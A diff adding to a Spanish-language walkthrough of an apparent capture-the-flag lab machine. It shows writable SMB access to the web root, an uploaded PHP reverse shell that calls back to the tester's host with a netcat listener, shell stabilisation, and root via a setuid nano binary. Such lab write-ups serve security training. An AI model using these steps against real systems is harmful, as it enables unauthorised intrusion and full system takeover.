@@ -106,10 +106,113 @@ smbclient -L //172.17.0.2 -U 'bob'
 <img width="1909" height="772" alt="imagen" src="https://github.com/user-attachments/assets/8f82221c-3c93-4c3e-99f3-4a3a5876dec5" />
 
 
-Vamos a acceder al recurso /html:
+Vemos algo muy interesante y es que tenemos acceso de lectura/escritura en el recurso web html. Vamos a acceder:
+```bash
+smbclient //172.17.0.2/hmtl -U 'bob'
+```
 
 
+<img width="1620" height="416" alt="imagen" src="https://github.com/user-attachments/assets/3af971d9-b7d4-429a-9820-913d9a8d467b" />
+
+Nos encontramos solo el index.html que si lo revisamos es el archivo que mostraba la web. Por tanto tenemos acceso de escritura sobre el document root de la aplicación web. A partir de ahí ya tendría sentido investigar qué tecnología ejecuta la web y qué tipo de archivo podría aprovecharse.
+
+Vamos a probar si se puede escribir. En mi caso subí el archivo `users.txt` que creamos antes. Si nos deja podemos ver el recurso en la web:
+
+```bash
+put users.txt
+```
+
+<img width="1150" height="196" alt="imagen" src="https://github.com/user-attachments/assets/6f960409-ffa4-4f64-90db-62f698411143" />
+
+Vemos que funciona. Por tanto vamos a probar a subir una webshell que nos permita acceder al servidor. La web solo usa Apache HTTP y su server es Ubuntu según el nmap y Wappalyzer. Vamos a probar si ejecuta php:
+```bash
+echo '<?php echo "PHP_OK"; ?>' > test.php
+
+# En SMB
+put test.php
+
+# Fuera de SMB
+curl http://172.17.0.2/test.php
+```
+Nos devuelve PHP_OK, por tanto el server ejecuta PHP. Subimos una reverse shell PHP:
+```bash
+ip a # sacar nuestra ip
+nano /usr/share/webshells/php/php-reverse-shell
+
+# Cambiar
+$ip = '172.17.0.1';  // CHANGE THIS
+$port = 1234;       // CHANGE THIS
+```
+
+```bash
+# Escuchar 
+nc -lnvp 1234
+```
+
+```bash
+# Subir webshell
+lcd /usr/share/webshells/php
+put php-reverse-shell.php
+```
+
+```bash
+# Ejecutar la reverse shell
+ curl http://172.17.0.2/php-reverse-shell.php
+```
+
+Obtenemos una shell donde estaba el nc:
+
+<img width="1346" height="235" alt="imagen" src="https://github.com/user-attachments/assets/94aabd44-64c5-4e88-80c2-7cfe760305b0" />
+
+Somos www-data. Tenemos que escalar privilegios ahora:
+
+**Escalada de privilegios**
+
+Para escalar privilegios usaremos los comandos básicos antes de pasar a usar linpeas.
+```bash
+sudo -l
+find / -perm -4000 -type f -user root 2>/dev/null
+```
+
+En el find de setuid encontramos un archivo interesante: nano
+
+Vamos a buscar un binario explotable de esto en GTFOBins:
+
+<img width="929" height="340" alt="imagen" src="https://github.com/user-attachments/assets/be428ee3-0bfa-4c68-a0c5-0e13eb6c4b9e" />
+
+Usaremos esto para escalar privs. Antes de hacer nada, vamos a estabilizar la shell para que se trate de una terminal normal, ya que tras la reverse shell esta es muy limitada: https://github.com/DCh4con/Apuntes_eJPTv2/blob/main/Apuntes_eJPTv2/Tratamiento%20TTY.md
+
+Para ello:
+```bash
+script /dev/null -c bash
+
+# Pulsa Ctrl + Z (esto enviará tu sesión al segundo plano/background).
+# En tu terminal de Kali, escribe el siguiente comando y pulsa Enter:
+stty raw -echo; fg  # (Nota: No verás lo que escribes, o puede que se vea raro, es normal. Al pulsar Enter, volverás a la shell de la víctima).
 
 
+reset xterm
+export TERM=xterm
+export SHELL=bash
+```
 
+Ahora para el binario:
+```bash
+nano -s '/bin/sh -p'
 
+# Dentro
+/bin/sh -p
+# El ^ T no es para escribir, es para que se ejecute lo que hay en nano.
+```
+
+En una terminal normal:
+
+^T = Ctrl + T
+
+Por tanto dentro de nano hacer Ctl+T y:
+
+<img width="701" height="120" alt="imagen" src="https://github.com/user-attachments/assets/96ed2be5-f417-4d3d-8228-d98846e1f17a" />
+
+Ya somos root. Hemos alcanzado privilegios máximos en el sistema.
+
+Máquina completada!
